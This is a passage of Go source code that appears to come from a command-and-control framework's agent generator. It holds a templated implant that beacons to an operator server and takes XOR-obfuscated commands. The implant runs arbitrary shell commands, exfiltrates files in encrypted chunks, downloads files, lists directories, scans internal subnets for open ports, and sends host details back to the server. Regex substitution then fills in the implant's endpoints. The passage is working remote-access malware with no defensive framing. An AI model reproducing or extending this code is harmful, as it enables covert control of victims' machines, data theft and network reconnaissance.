        get_headers map[string]string= map[string]string{"Accept":"q=0.7;text/html,application/xhtml+xml","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        post_headers map[string]string= map[string]string{"Content-Type":"application/json","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6","Cache-Control":"max-age=0","Upgrade-Insecure-Requests": "1","User-Agent":"Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0","Connection":"keep-alive",}
        keyPartArr []int
        transport http.RoundTripper
        client *http.Client
        file_byte_parts = make(map[string][]byte)
    )
    /*main_str*/
    func initHttpClient() {
        transport = &http.Transport{
            MaxIdleConnsPerHost: 100,
            MaxIdleConns:        100,
            IdleConnTimeout:     0,
            DisableKeepAlives:   false,
            DialContext: (&net.Dialer{
                Timeout:   30 * time.Second,
                KeepAlive: 30 * time.Second,
            }).DialContext,
            /*protocol_str*/
        }
        client = &http.Client{
            Transport: transport,
            Timeout:   30 * time.Second,
        }
    }
    func getUrl(url string) string {
        var resp *http.Response
        req, err := http.NewRequest("GET", url, nil)
        if err != nil {
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        for key, value := range get_headers {
            req.Header.Set(key, value)
        }
        resp, err = client.Do(req)
        if err != nil {
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        respBody, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            resp.Body.Close()
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        resp.Body.Close()
        if len(respBody) == 0 {
            return ""
        }
        return strings.TrimSpace(string(respBody)) // 成功返回响应
    }
    func post(data map[string]string, re_url string) {
        var jsonData bytes.Buffer
        jsonData.WriteString("{")
        for key, value := range data {
            jsonData.WriteString("\"" + key + "\":\"" + value + "\",")
        }
        jsonStr := jsonData.String()
        if len(jsonStr) > 1 {
            jsonStr = jsonStr[:len(jsonStr)-1]
        }
        jsonStr += "}"
        req, err := http.NewRequest("POST", re_url, bytes.NewBuffer([]byte(jsonStr)))
        if err != nil {
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        for key, value := range post_headers {
            req.Header.Set(key, value)
        }
        resp, err := client.Do(req)
        if err != nil {
            time.Sleep(time.Duration(waitTime) * time.Second)
            run()
        }
        resp.Body.Close()
        return // 成功后退出函数
    }
    // 下载并解密文件
    func downloadFile(re_url, fileKey string) {
        encryData := get_encry_s(&fileKey)
        url := protocol + master + "//*Path*/?/*option*/=/*download*/&/*uid*/=" + uid + "&/*filekey*/=" + encryData
        filesplit := strings.Split(fileKey, "*")
        if len(filesplit) < 3{
            delete(file_byte_parts, fileKey)
            return
        } 
        filename := filesplit[1]
        var fullData []byte
        for {
            response, err := http.Get(url)
            if err != nil {
                delete(file_byte_parts, fileKey)
                return
            }
            defer response.Body.Close()
            fileData, err := io.ReadAll(response.Body)
            if err != nil {
                delete(file_byte_parts, fileKey)
                return
            }
            if len(fileData) == 0 {
                break
            }
            fullData = append(fullData, fileData...)
            time.Sleep(time.Duration(delay) * time.Second)
        }
        file_byte_parts[fileKey] = fullData
        if err := get_encry_f(filename, fileKey); err != nil {
            return
        }
    }
    // 上传
    func getUfile(cmd, splitSize string) {
        intSize, _ := strconv.Atoi(splitSize)
        fileContent, _ := get_decry_f(cmd)
        fileSize := len(fileContent)
        start := 0 
        end := intSize       
        for start < fileSize {
            if end > fileSize {
                end = fileSize
            }
            str_encry := user + "^" + splitSize + "^" + strconv.Itoa(fileSize) + "^" + strconv.Itoa(start) + "^" + strconv.Itoa(end)
            data_encry := get_encry_s(&str_encry)
            chunk := fileContent[start:end]
            var buffer bytes.Buffer
            writer := multipart.NewWriter(&buffer)
            part, _ := writer.CreateFormFile("/*upload*/", get_encry_s(&cmd)) // 使用实际的文件名
            io.Copy(part, bytes.NewReader(chunk))
            writer.WriteField("/*uid*/", uid)
            writer.WriteField("/*result*/", data_encry)
            writer.Close()
            url := protocol + master + "//*Path*/?/*option*/=/*upload*/"
            req, _ := http.NewRequest("POST", url, &buffer)
            req.Header.Set("Content-Type", writer.FormDataContentType())
            req.Header.Set("Range", "bytes"+strconv.Itoa(start)+"-"+strconv.Itoa(end-1))
            resp,err := client.Do(req)
            if err != nil {
                return
            }
            defer resp.Body.Close()
            if resp.StatusCode != http.StatusOK {
                return
            }
            start = end
            end = start + intSize
            time.Sleep(time.Duration(delay) * time.Second)
        }
    }
    
    func getCmd() {
        url := protocol + master + "//*Path*/?/*option*/=/*MsgPath*/&/*uid*/="+uid
        re_url := protocol + master + "//*Path*/?/*option*/=/*result*/"
        file_url := protocol + master + "//*Path*/?/*option*/=/*list*/"
        var job,shell string
        var msg []string
        for {
            time.Sleep(time.Duration(delay) * time.Second)
            respBody := getUrl(url)
            if respBody == "" {
                continue
            }else if respBody == uid{
                onece = true
                run()
            }
            cmd := get_decry_s(&respBody)
            msg=strings.Split(cmd,"^")
            job=string(msg[0])
            if len(msg)>1{
                shell=string(msg[1])
            }
            switch job {
                case "getUfriends":
                    go scan_u_firends(msg[1],msg[2],msg[3],msg[4],"ping")
                case "getTime":
                    getTime(msg[1])
                case "getUfile":
                    go getUfile(msg[1],msg[2])
                case "loadUfile":
                    go downloadFile(re_url,msg[1])
                case "lookUpFile":
                    listDir(shell,file_url)
                case "getHisports":
                    go scan_u_firends(msg[1],msg[2],msg[3],msg[4],"port")
                case "SwUVer":
                    version = shell
                /*code*/
                default:
                    go get_Command(cmd,re_url)
            }
        }
    }
    func get_Command(cmd,re_url string) {
        result := Command(cmd)
        if result != "" {
            encry_result := get_encry_s(&result)
            if encry_result == "" {
                encry_result = "error"
            }
            data:= map[string]string{
                "/*uid*/": uid,
                "/*result*/": encry_result,
            }
            post(data, re_url)
        }
        return
    }
    
    func Command(cmd string) string {
        /*os_str*/
    }
    func listDir(cmd, file_url string) {
        var fileNames string
        files, _ := ioutil.ReadDir(cmd)
        for _, file := range files {
            modTime := file.ModTime()
            modTimeStr := modTime.Format("2006-01-02 15:04:05")
            permissions := file.Mode().String()
            if file.IsDir() {
                fileNames += "dir " + file.Name() + "<" + permissions + "><" + modTimeStr + ">\n"
            } else {
                fileSize := file.Size()
                fileSizeMB := float64(fileSize) / (1024 * 1024)
                fileSizeStr := strconv.FormatFloat(fileSizeMB, 'f', 2, 64)
                fileNames += "fil " + file.Name() + "<" + fileSizeStr + ".MB><" + permissions + "><" + modTimeStr + ">\n"
            }
        }
        if fileNames == "" {
            fileNames = "empty"
        }
        encryptedStr := get_encry_s(&fileNames)
        data := map[string]string{
            "/*uid*/":  uid,
            "/*result*/": encryptedStr,
        }
        post(data, file_url)
    }
    func getTime(s_delay string) {
        parsedTime, _ := strconv.ParseInt(s_delay, 10, 8)
        delay = int8(parsedTime)
        if t, ok := transport.(*http.Transport); ok {
            if delay >= 30 {
                t.IdleConnTimeout = 5 * time.Second
            } else {
                t.IdleConnTimeout = 0
            }
        }
        return
    }
    func split_comment(portList string)[]string{
        var temp_split []string
        var port_list []string
        if strings.Contains(portList, ",") {
            temp_split = strings.Split(portList, ",")
            return temp_split
        } else if strings.Contains(portList, "-") {
            temp_split = strings.Split(portList, "-")
            start_port,_:= strconv.Atoi(temp_split[0])
            end_port,_:= strconv.Atoi(temp_split[1])
            for i := start_port; i <= end_port; i++ {
                str:=strconv.Itoa(i)
                port_list = append(port_list, str)
            }
        } else {
            port_list = append(port_list, portList)
            return port_list
        }
        return port_list
    }
    func scan_u_firends(ip, portList, delay, choice, option string) {
        var resultBuilder strings.Builder
        var mutex sync.Mutex
        var open_ports, re_url string
        port_list := split_comment(portList)
        if len(port_list) > 65535 {
            return
        }
        sleep_time, _ := strconv.Atoi(delay)
        if option == "port" {
            for _, port := range port_list {
                time.Sleep(time.Duration(sleep_time) * time.Second)
                scan_port(ip, port, sleep_time,&resultBuilder, &mutex)
            }
        } else if option == "ping" {
            ip_split := strings.Split(ip, ".")
            new_ip := strings.Join(ip_split[:3], ".") + "."
            ping_list := split_comment(ip_split[3])
            if len(ping_list) > 255 {
                return
            }
            for _, i := range ping_list {
                target := new_ip + i
                for _, p := range port_list {
                    time.Sleep(time.Duration(sleep_time) * time.Second)
                    scan_port(target, p, sleep_time,&resultBuilder, &mutex)
                }
            }
        }
        open_ports = resultBuilder.String()
        encrypted_data := get_encry_s(&open_ports)
        data := map[string]string{
            "/*uid*/":    uid,
            "/*result*/": encrypted_data,
        }
        if choice == "save" {
            re_url = protocol + master + "//*Path*/?/*option*/=/*_net*/"
        } else {
            re_url = protocol + master + "//*Path*/?/*option*/=/*result*/"
        }
        post(data, re_url)
    }
    
    func scan_port(ip, port string, sleep_time int, resultBuilder *strings.Builder, mutex *sync.Mutex) {
        sleepTime := time.Duration(sleep_time) * time.Second
        conn, err := net.DialTimeout("tcp", ip+":"+port, sleepTime)
        if err != nil {
            return // 无法连接，说明端口未开放
        }
        defer conn.Close()
        // 尝试读取 banner，但不强求
        conn.SetReadDeadline(time.Now().Add(sleepTime))
        buf := make([]byte, 128)
        n, _ := conn.Read(buf) // 忽略错误
        banner := ""
        if n > 0 {
            banner = string(buf[:n])
        }
        var target string
        if banner == "" {
            target = ip + ":[" + port + "]"
        } else {
            target = ip + ":[" + port + " - {{{" + banner + "}}}]"
        }

        mutex.Lock()
        resultBuilder.WriteString(target + "\n")
        mutex.Unlock()
    }
    
    func getInternalIPs() string {
        var ips []string
        interfaces, _ := net.Interfaces()
        for _, iface := range interfaces {
            if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
                continue
            }
            addrs, _ := iface.Addrs()
            for _, addr := range addrs {
                var ip net.IP
                switch v := addr.(type) {
                case *net.IPNet:
                    ip = v.IP
                case *net.IPAddr:
                    ip = v.IP
                }
                if ip != nil && ip.To4() != nil {
                    ips = append(ips, ip.String())
                }
            }
        }
        return strings.Join(ips, ",")
    }
    func generateUUID() string {
        rand.Seed(time.Now().UnixNano())
        uuid := make([]byte, 12)
        for i := 0; i < 12; i++ {
            uuid[i] = byte(rand.Intn(256))
        }
        uuid[6] = (uuid[6] & 0x0f) | 0x40
        uuid[8] = (uuid[8] & 0x3f) | 0x80
        uuidStr := byteSliceToHex(uuid[0:4]) + "-" +
            byteSliceToHex(uuid[4:6]) + "-" +
            byteSliceToHex(uuid[6:8]) + "-" +
            byteSliceToHex(uuid[8:10]) + "-" +
            byteSliceToHex(uuid[10:])
        return uuidStr
    }
    func byteSliceToHex(bytes []byte) string {
        hexChars := "0123456789abcdef"
        result := make([]byte, len(bytes)*2)
        for i, b := range bytes {
            result[i*2] = hexChars[b>>4]
            result[i*2+1] = hexChars[b&0x0f]
        }
        return string(result)
    }
    func send() {
        re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
        currentDir, _:= os.Getwd()
        currentDir = strings.ReplaceAll(currentDir, "\\", "/")
        parts := strings.Split(master, ":")
        add_str := clientname +"^"+ user +"^"+ osname +"^"+ strconv.Itoa(int(delay)) +"^"+ getInternalIPs() +"^"+ currentDir +"^"+ version +"^"+ parts[1] +"^"+ protocol
        encry_str := get_encry_s(&add_str)
        data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
        post(data, re_url)
    }
    // 加密函数
    func EncryptDecrypt(input []byte) []byte {
        if len(input) == 0 {
            return nil
        }
        var result []byte
        startIndex := 0
        for i := 0; i < len(keyPartArr); i++ {
            if len(input) <= keyPartArr[i] {
                if keyPartArr[i] < len(key){
                    startIndex = len(key) % keyPartArr[i]
                    break
                }else{
                    startIndex = keyPartArr[i] % len(key)
                    break
                }
            }else{
                startIndex = len(key) % int(key[keyPartArr[i]%len(key)])
            }
        }
        for i, b := range input {
            key_ := key[(startIndex+i)%len(key)]
            result = append(result, b^key_)
        }
        return result
    }
    func get_decry_f(filePath string) ([]byte, error) {
        data,_:= ioutil.ReadFile(filePath)
        decrypted := EncryptDecrypt(data)
        return decrypted, nil
    }
    func get_encry_f(filepath, file_key string) error {
        data,_ := file_byte_parts[file_key]
        defer delete(file_byte_parts, file_key)
        decrypted := EncryptDecrypt(data)
        err := os.WriteFile(filepath, decrypted, 0666)
        if err != nil {
            return err
        }
        return nil
    }
    
    // 加密字符串
    func get_encry_s(input *string) string {
        encryptedBytes := EncryptDecrypt([]byte(*input))
        return base64.URLEncoding.EncodeToString(encryptedBytes)
    }
    // 解密字符串
    func get_decry_s(input *string) string {
        // Base64 解码
        decodedBytes, err := base64.URLEncoding.DecodeString(*input)
        if err != nil {
            return ""
        }
        decryptedBytes := EncryptDecrypt(decodedBytes)
        return string(decryptedBytes)
    }
    func decryptString(key string, pavi_key []int) string {
        if key != "null" {
            client_key := []byte(key)
            for j := 0; j < 256 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[0]) {client_key[j] = client_key[j] ^ byte(pavi_key[0])}}
            for j := 256; j < 512 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[1]) {client_key[j] = client_key[j] ^ byte(pavi_key[1])}}
            for j := 512; j < 768 && j < len(client_key); j++ {if client_key[j] < byte(pavi_key[2]) {client_key[j] = client_key[j] ^ byte(pavi_key[2])}}
            for j := 768; j < len(client_key); j++ {if client_key[j] < byte(pavi_key[3]) {client_key[j] = client_key[j] ^ byte(pavi_key[3])}}
            return string(client_key)
        }
        return "null"
    }
    func generateAndUpdateKey(url, uid string) []int {
        key_map := []int{rand.Intn(50) + 1, rand.Intn(50) + 1, rand.Intn(50) + 1, rand.Intn(50) + 1}
        respBody := getUrl(url)
        if respBody == "" {
            return nil
        }
        conn_parts := strings.Split(respBody, "-")
        if len(conn_parts) < 8 {
            time.Sleep(2 * time.Second)
            run()
        }
        serverpub_key := conn_parts[:4]
        servermid := conn_parts[4:]
        for i := 0; i < len(serverpub_key); i++ {
            serverVal, _ := strconv.Atoi(serverpub_key[i])
            clientVal := key_map[i]
            exchangeVal := serverVal ^ clientVal
            key_map = append(key_map, exchangeVal)
        }
        for i := 0; i < len(servermid); i++ {
            serverVal, _ := strconv.Atoi(servermid[i])
            exchangeVal := key_map[i]
            intermediateVal := serverVal ^ exchangeVal
            key_map = append(key_map, intermediateVal)
        }
        key_url := protocol + master + "//*Path*/?/*option*/=/*switch_key*/&/*uid*/=" + uid + "&/*keyPart*/=" + strconv.Itoa(key_map[4]) + "-" + strconv.Itoa(key_map[5]) + "-" + strconv.Itoa(key_map[6])+ "-" + strconv.Itoa(key_map[7])
        getUrl(key_url)
        return []int{key_map[8], key_map[9], key_map[10],key_map[11]}
    }
    func getConn(newKey_map *[]int) {
        key = "null"
        keyPartArr = []int{}
        get_keyUrl := protocol + master + "//*Path*/?/*option*/=/*encry_key*/&/*uid*/=" + uid
        for {
            time.Sleep(time.Duration(delay) * time.Second)
            key_str := getUrl(get_keyUrl)
            key =  decryptString(key_str,*newKey_map)
            if key !="null"{
                onece = false
                return
            }
        }
    }
    func run() {
        if onece {
            initHttpClient()
            if uid == "" {uid = generateUUID()}
            if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
            clientname = strings.TrimSpace(Command("hostname"))
            post_headers["Host"] = master
            get_headers["Host"] = master
            user_b := base64.URLEncoding.EncodeToString([]byte(user))
            client_b := base64.URLEncoding.EncodeToString([]byte(clientname))
            uid_b := base64.URLEncoding.EncodeToString([]byte(uid))
            url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid_b + "&/*user*/=" + user_b + "&/*hostname*/=" + client_b
            newKey_map:= generateAndUpdateKey(url, uid)
            for {
                getConn(&newKey_map)
                if !onece && key != "null" && len(key) >= 1024 {
                    keyPartArr = append(keyPartArr,
                                        6, 17,int(math.Abs(float64(key[24] - 1))),
                                        int(key[13]),int(key[74]) + 24,
                                        45, 78,int(key[45]) + int(key[67]),
                                        int(key[79]) + int(key[89]) + int(key[106]),128,
                                        int(key[85]) + int(key[94]) + int(key[189]) + int(key[216]),
                                        256, 384,512 + int(key[196]),
                                        int(key[43]) + int(key[443]) + 640,
                                        768 + int(key[569]),len(key) - 25,
                                        int(math.Abs(math.Sin(float64(key[445])) * 128)) * 12,
                                        int(math.Log(float64(key[530])+1) * 255) * 24,
                                        int(math.Pow(float64(key[660]), 1) * 48),
                                        int(math.Sqrt(float64(key[970]))) * 64,
                                        (len(key) + int(key[1024])) * 128,
                                    )
                    send()
                    getCmd()
                } else {
                    continue
                }
            }
        }else{getCmd()}
    }
    `
	replacements := map[string]string{
		`/\*sys_str\*/`:           sys_str,
		`/\*tls_str\*/`:           tls_str,
		`/\*protocol_var\*/`:      protocol_var,
		`/\*os\*/`:                o_os,
		`/\*Username\*/`:          u_username,
		`/\*server\*/`:            s_server,
		`/\*protocol_str\*/`:      protocol_str,
		`/\*main_str\*/`:          main_str,
		`/\*os_str\*/`:            os_str,
		`/\*Path\*/`:              Path,
		`/\*ConnPath\*/`:          ConnPath,
		`/\*MsgPath\*/`:           MsgPath,
        `/\*package_str\*/`:       package_str,
        `/\*switch_key\*/`:        switch_key,
        `/\*encry_key\*/`:         encry_key,
        `/\*download\*/`:          download,
        `/\*result\*/`:            result,
        `/\*_net\*/`:              _net,
        `/\*info\*/`:              info,
        `/\*upload\*/`:            upload,
        `/\*list\*/`:              list,
        `/\*option\*/`:            option,
        `/\*user\*/`:              user,
        `/\*uid\*/`:            uid,
        `/\*hostname\*/`:          hostname,
        `/\*keyPart\*/`:           keyPart,
        `/\*filekey\*/`:           filekey,
        `/\*code\*/`:              code,
	}
	// 进行替换
	for pattern, replacement := range replacements {
		re := regexp.MustCompile(pattern)
		agents = re.ReplaceAllString(agents, replacement)
	}
	// 检查是否有未替换的占位符
	if regexp.MustCompile(`/\*.*?\*/`).FindString(agents) != "" {
        //日志
        logger.WriteLog("⚠️ agent code There are still placeholders that have not been replaced!")
	}
	return agents
}